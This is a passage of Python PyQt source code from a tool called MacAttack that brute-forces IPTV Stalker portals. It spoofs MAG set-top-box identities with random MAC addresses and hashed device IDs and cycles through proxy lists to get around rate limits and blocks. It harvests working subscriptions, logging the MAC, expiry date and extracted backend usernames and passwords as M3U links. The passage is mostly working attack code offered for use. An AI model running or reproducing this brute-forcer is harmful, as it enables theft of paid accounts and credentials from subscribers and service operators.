        self.start_button.setDisabled(False)
        self.stop_button.setDisabled(True)

        # Button styles
        self.stop_button.setStyleSheet("""
            QPushButton:disabled {
                background-color: grey;
            }
            QPushButton:enabled {
                background-color: red;
            }
        """)
        self.start_button.setStyleSheet("""
            QPushButton:disabled {
                background-color: grey;
            }
            QPushButton:enabled {
                background-color: green;
            }
        """)

        # Add spacer to the right of the Stop button
        right_spacer = QSpacerItem(10, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
        combined_layout.addItem(right_spacer)

        # Add the combined layout to the main layout
        layout.addLayout(combined_layout)
        layout.addSpacing(15)  # Adds space

        # MAC address label
        self.brute_mac_label = QLabel("Testing MAC address will appear here.")
        layout.addWidget(self.brute_mac_label, alignment=Qt.AlignCenter)
        layout.addSpacing(15)  # Adds space

        # Output Text Area
        self.output_text = QTextEdit()
        self.output_text.setStyleSheet("""
            color: white;
            background-color: #10273d;
            border: 12px solid #2E2E2E;
        """)
        self.output_text.setPlainText("Output LOG:\nResults will appear here.\n")
        self.output_text.setReadOnly(True)
        monospace_font = QFont("Lucida Console", 10)
        self.output_text.setFont(monospace_font)                        
        layout.addWidget(self.output_text)

        # Error Log Area
        self.error_text = QTextEdit()
        self.error_text.setStyleSheet("""
            color: grey;
            background-color: #451e1c;
            border-top: 0px;
            border-left: 12px solid #2E2E2E;
            border-right: 12px solid #2E2E2E;
            border-bottom: 0px;
        """)
        self.error_text.setHtml("")
        self.error_text.setHtml("""
        Error LOG:<br>It's normal for errors to appear down here.
        """)
        self.error_text.setReadOnly(True)
        self.error_text.setFont(monospace_font)
        layout.addWidget(self.error_text)
        layout.addSpacing(15)  # Adds space
    
    def SaveTheDay(self):
        """Save user settings, including window geometry, active tab, and other preferences to the configuration file."""
        user_dir = os.path.expanduser('~')
        os.makedirs(os.path.join(user_dir, 'evilvir.us'), exist_ok=True)
        file_path = os.path.join(user_dir, 'evilvir.us', 'MacAttack.ini')
        
        config = configparser.ConfigParser()
        config['Settings'] = {
            'iptv_link': self.iptv_link_entry.text(),
            'concurrent_tests': self.concurrent_tests.value(),
            'hostname': self.hostname_input.text(),
            'mac': self.mac_input.text(),
            'autoloadmac': str(self.autoloadmac_checkbox.isChecked()),
            'autostop': str(self.autostop_checkbox.isChecked()),
            'successsound': str(self.successsound_checkbox.isChecked()),
            'autopause': str(self.autopause_checkbox.isChecked()),
            'active_tab': str(self.tabs.currentIndex()),
            'proxy_enabled': str(self.proxy_enabled_checkbox.isChecked()),
            'proxy_list': self.proxy_textbox.toPlainText(),
            'proxy_concurrent_tests': str(self.proxy_concurrent_tests.value()),
            'proxy_remove_errorcount': str(self.proxy_remove_errorcount.value()),
            'ludicrous_speed': str(self.ludicrous_speed_checkbox.isChecked())  # Save Ludicrous speed state
        }
        
        config['Window'] = {
            'width': self.width(),
            'height': self.height(),
            'x': self.x(),
            'y': self.y()
        }
        
        with open(file_path, 'w') as configfile:
            config.write(configfile)
        logging.debug("Settings saved.")

    def load_settings(self):
        """Load user settings from the configuration file and apply them to the UI elements, including the active tab."""

        
        user_dir = os.path.expanduser('~')
        file_path = os.path.join(user_dir, 'evilvir.us', 'MacAttack.ini')
        
        config = configparser.ConfigParser()
        if os.path.exists(file_path):
            config.read(file_path)
            
            # Load UI settings
            self.iptv_link_entry.setText(config.get('Settings', 'iptv_link', fallback="http://evilvir.us.streamtv.to:8080/c/"))
            self.concurrent_tests.setValue(config.getint('Settings', 'concurrent_tests', fallback=10))
            self.hostname_input.setText(config.get('Settings', 'hostname', fallback=""))
            self.mac_input.setText(config.get('Settings', 'mac', fallback=""))
            
            # Load checkbox states
            self.autoloadmac_checkbox.setChecked(config.get('Settings', 'autoloadmac', fallback="False") == "True")
            self.autostop_checkbox.setChecked(config.get('Settings', 'autostop', fallback="False") == "True")
            self.successsound_checkbox.setChecked(config.get('Settings', 'successsound', fallback="False") == "True")
            self.autopause_checkbox.setChecked(config.get('Settings', 'autopause', fallback="True") == "True")
            self.proxy_enabled_checkbox.setChecked(config.get('Settings', 'proxy_enabled', fallback="False") == "True")
            
            # Load Ludicrous speed checkbox state
            ludicrous_speed_state = config.get('Settings', 'ludicrous_speed', fallback="False")
            self.ludicrous_speed_checkbox.setChecked(ludicrous_speed_state == "True")
            
            # Load other proxy settings
            self.proxy_textbox.setPlainText(config.get('Settings', 'proxy_list', fallback=""))
            self.proxy_concurrent_tests.setValue(config.getint('Settings', 'proxy_concurrent_tests', fallback=100))
            self.proxy_remove_errorcount.setValue(config.getint('Settings', 'proxy_remove_errorcount', fallback=1))
            
            # Load active tab
            self.tabs.setCurrentIndex(config.getint('Settings', 'active_tab', fallback=0))
            
            # Load window geometry
            if config.has_section('Window'):
                self.resize(config.getint('Window', 'width', fallback=800), 
                            config.getint('Window', 'height', fallback=600))
                self.move(config.getint('Window', 'x', fallback=200), 
                          config.getint('Window', 'y', fallback=200))
            logging.debug("Settings loaded.")
        else:
            logging.debug("No settings file found.")
        
    def set_window_icon(self):
        # Base64 encoded image string (replace with your own base64 string)
        base64_image_data = "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"

        # Decode the base64 string
        image_data = base64.b64decode(base64_image_data)

        # Create a QPixmap from the decoded data
        pixmap = QPixmap()
        byte_array = QByteArray(image_data)
        buffer = QBuffer(byte_array)
        buffer.open(QBuffer.ReadOnly)
        pixmap.loadFromData(buffer.data())

        # Set the QIcon using the pixmap
        self.setWindowIcon(QIcon(pixmap))    

    def TestDrive(self):
        # Update button states immediately
        self.running = True
        self.start_button.setDisabled(True)
        self.stop_button.setDisabled(False)
        if self.proxy_enabled_checkbox.isChecked():
            self.brute_mac_label.setText("Please Wait...\nLoading the worker proxies into the background and assigning tasks.")
        else:
            self.brute_mac_label.setText("Please Wait...")
        
        # Pause for 1 second before starting threads
        QTimer.singleShot(1000, self.start_threads)

    def start_threads(self):
        # Offload thread creation to a worker thread
        creation_thread = threading.Thread(target=self._create_threads)
        creation_thread.daemon = True
        creation_thread.start()

    def _create_threads(self):
        # Get and parse the IPTV link
        self.iptv_link = self.iptv_link_entry.text()
        self.parsed_url = urlparse(self.iptv_link)
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or 80
        self.base_url = f"http://{self.host}:{self.port}"

        # Calculate the number of threads to start
        num_tests = self.concurrent_tests.value()

        if self.proxy_enabled_checkbox.isChecked() and num_tests > 1:
            max_value = 500
            if max_value < 15:
                max_value = 15
            num_tests = 1 + (num_tests - 1) * (max_value - 1) / (100 - 1)
            num_tests = int(num_tests)

            if self.ludicrous_speed_checkbox.isChecked() and num_tests > 1:
                max_value = 5000
                if max_value < 15:
                    max_value = 15
                num_tests = 1 + (num_tests - 1) * (max_value - 1) / (1800 - 1)
                num_tests = int(num_tests)
        else:
            max_value = 15
            num_tests = 1 + (num_tests - 1) * (max_value - 1) / (100 - 1)
            num_tests = int(num_tests)

        # Start threads to test MACs
        for _ in range(num_tests):
            thread = threading.Thread(target=self.BigMacAttack)
            thread.daemon = True
            thread.start()

            # Track threads
            self.threads.append(thread)

        # Optional: Save state or perform setup actions
        self.SaveTheDay()
            
    def RandomMacGenerator(self, prefix="00:1A:79:"):
        # Create random MACs. Purely for mischief. Don't tell anyone.
        return f"{prefix}{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"

    def macattack_update_proxy_textbox(self, new_text):
        # Slot to handle signal
        self.proxy_textbox.setText(new_text)
            
    def BigMacAttack(self):
        
        proxies = []  # Default to empty list in case no proxies are provided
        
        self.error_count = 0
        # BigMacAttack: Two all-beef patties, special sauce, lettuce, cheese, pickles, onions, on a sesame seed bun.
        while self.running:  # Loop will continue as long as self.running is True
            if self.proxy_enabled_checkbox.isChecked():
                # Get the proxies from the textbox, splitting by line
                proxies = self.proxy_textbox.toPlainText().strip().splitlines()

                # Check if the proxy list is empty
                if not proxies:
                    # Show error message
                    self.stop_button.click()
                    self.update_error_text_signal.emit("ERROR: Proxy list is empty")
                    return  # Stop the process if no proxies are available

                # Choose a random proxy from the list
                selected_proxy = random.choice(proxies)
                logging.debug(f"Using proxy: {selected_proxy}")
                # Ensure the proxy is set correctly as a dictionary
                proxies = {"http": selected_proxy, "https": selected_proxy}
            else:
                selected_proxy = "Your Connection"
            mac = self.RandomMacGenerator()  # Generate a random MAC 

            #convert the mac into various hashes, if anything this will add randomness to the requests
            mac_md5 = hashlib.md5(mac.encode('utf-8')).hexdigest().upper()
            mac_sha256 = hashlib.sha256(mac.encode('utf-8')).hexdigest().upper()
            mac_sha1 = hashlib.sha1(mac.encode('utf-8')).hexdigest()

            
            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
            device_id = mac_sha256
            # device_id2: First 13 digits of MD5 + MAC, then encoded in SHA256, according to 
            device_id2_input = serial[:13] + mac  # Combine first 13 digits of MD5 + MAC
            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input

            #logging the results
            #logging.debug(f"Serial: {serial}")
            #logging.debug(f"Device ID: {device_id}")
            #logging.debug(f"Device ID2: {device_id2}") 
            
            
            if not proxies:
                self.update_mac_label_signal.emit(f"Testing MAC: {mac}")
            if proxies:
                self.update_mac_label_signal.emit(f"Testing MAC: {mac}, Using PROXY: {selected_proxy}")

            try:
                s = requests.Session()  # Create a session
                #s.cookies.update({'mac': mac})
                
                s.cookies.update({
                    "adid": mac_sha1,
                    "debug": "1",
                    "device_id2": device_id2,
                    "device_id": device_id,
                    "hw_version": "1.7-BD-00",
                    "mac": mac,
                    "sn": serial[:13], #cut to 13 digits
                    "stb_lang": "en",
                    "timezone": "America/Los_Angeles",
                })
                
                s.headers.update({
                    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "X-User-Agent": "Model: MAG250; Link: WiFi",
                })
                     
                url = f"{self.base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"

                # If proxy is enabled, add the proxy to the session
                if proxies:
                    s.proxies.update(proxies)

                res = s.get(url, timeout=10, allow_redirects=False)

                if res.text:
                    data = json.loads(res.text)
                    tok = data.get('js', {}).get('token')  # Safely access token to prevent KeyError

                    url2 = f"{self.base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                    headers = {
                        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                        "Authorization": f"Bearer {tok}",
                        "X-User-Agent": "Model: MAG250; Link: WiFi",
                    }

                    res2 = s.get(url2, headers=headers, timeout=10, allow_redirects=False)

                    if res2.text:
                        data = json.loads(res2.text)
                        if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:
                            mac = data['js']['mac']
                            expiry = data['js']['phone']

                            url3 = f"{self.base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
                            res3 = s.get(url3, headers=headers, timeout=10, allow_redirects=False)

                            count = 0
                            if res3.status_code == 200:
                                url4 = f"{self.base_url}/portal.php?type=itv&action=create_link&cmd=http://localhost/ch/1_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
                                res4 = s.get(url4, headers=headers, timeout=10, allow_redirects=False)
                                data4 = json.loads(res4.text)

                                cmd_value4 = data4["js"]["cmd"].replace("ffmpeg ", "", 1)
                                cmd_value4 = cmd_value4.replace("'ffmpeg' ", "")
                                
                                logging.debug(cmd_value4)

                                parsed_url = urlparse(cmd_value4)
                                domain_and_port = f"{parsed_url.scheme}://{parsed_url.hostname}:{parsed_url.port}" if parsed_url.port else f"{parsed_url.scheme}://{parsed_url.hostname}"

                                logging.debug(f"Real Host: {domain_and_port}")

                                path_parts = parsed_url.path.strip("/").split("/")
                                m3ufound = 0
                                if len(path_parts) >= 3:
                                    username = path_parts[0]
                                    password = path_parts[1]
                                    logging.debug(f"Username: {username}")
                                    logging.debug(f"Password: {password}")
                                    logging.debug(f"M3U: {domain_and_port}/get.php?username={username}&password={password}&type=m3u_plus&output=ts")
                                    #m3ufound = 0 #disable it by changing it to 0
                                    m3ufound = 1
                                else:
                                    logging.debug("Less than 2 subdirectories found in the path.")
                                    m3ufound = 0

                                try:
                                    response_data = json.loads(res3.text)
                                    if isinstance(response_data, dict) and "js" in response_data and "data" in response_data["js"]:
                                        channels_data = response_data["js"]["data"]
                                        count = len(channels_data)
                                    else:
                                        self.update_error_text_signal.emit("Unexpected data structure for channels.")
                                        count = 0
                                except (TypeError, json.decoder.JSONDecodeError) as e:
                                    self.update_error_text_signal.emit(f"Data parsing error for channels data: {str(e)}")
                                    count = 0

                            if count > 0:
                                logging.info("Mac found")
                                if self.autoloadmac_checkbox.isChecked():
                                    self.hostname_input.setText(self.base_url)
                                    self.mac_input.setText(mac)

                                if self.output_file is None:
                                    output_filename = self.OutputMastermind()
                                    self.output_file = open(output_filename, "a")

                                if m3ufound:
                                    result_message = (
                                        f"{'Host:':<10} {self.iptv_link}\n"
                                        f"{'Backend:':<10} {domain_and_port}\n"
                                        f"{'MAC:':<10} {mac}\n"
                                        f"{'Expiry:':<10} {expiry}\n"
                                        f"{'Channels:':<10} {count}\n"
                                        f"{'M3U:':<10} {self.base_url}/get.php?username={username}&password={password}&type=m3u_plus&output=ts\n\n"
                                    )

                                    self.update_output_text_signal.emit(result_message)

                                else:
                                    result_message = (
                                        f"{'Portal:':<10} {self.iptv_link}\n"
                                        f"{'MAC:':<10} {mac}\n"
                                        f"{'Expiry:':<10} {expiry}\n"
                                        f"{'Channels:':<10} {count}\n\n"
                                    )
                                    self.update_output_text_signal.emit(result_message)

                                self.output_file.write(result_message)
                                self.output_file.flush()  # Ensures data is written immediately
                                if self.successsound_checkbox.isChecked():
                                    sound_thread = threading.Thread(target=self.play_success_sound)
                                    sound_thread.start()  # Start the background thread

                                if self.autostop_checkbox.isChecked():
                                    logging.debug("autostop_checkbox is checked, stopping...")
                                    self.stop_button.click()
                            else:
                                result_message = f"MAC: {mac} connects, but has 0 channels. Bummer."
                                self.update_error_text_signal.emit(result_message)
                        else:
                            #self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")
                            logging.debug(f"No JSON response for MAC {mac}")
   
            #Try failed because data was non json    
            except (json.decoder.JSONDecodeError, requests.exceptions.RequestException, TypeError) as e:
                if "Expecting value" in str(e):
                    #logging.debug(f"Raw Response Content:\n{mac}\n%s", res.text)
                    
                    if (
                        "503 Service" in res.text
                        or "521: Web server is down" in res.text
                        or "The page is temporarily unavailable" in res.text
                    ):
                        self.update_error_text_signal.emit(f"Error for Portal: <b>503 Rate Limited</b> {selected_proxy}")
                        self.temp_remove_proxy(selected_proxy)
                        #break                    

              
                    elif "ERR_ACCESS_DENIED" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1 
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Access Denied</b> Proxy refused access.")
                      
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "READ_ERROR" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>ERR_READ_ERROR</b> proxy Could not connect.")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif (
                        "Could not connect" in res.text
                        or "Network is unreachable" in res.text
                    ):
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Could not connect</b> proxy Could not connect.")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "Blocked" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
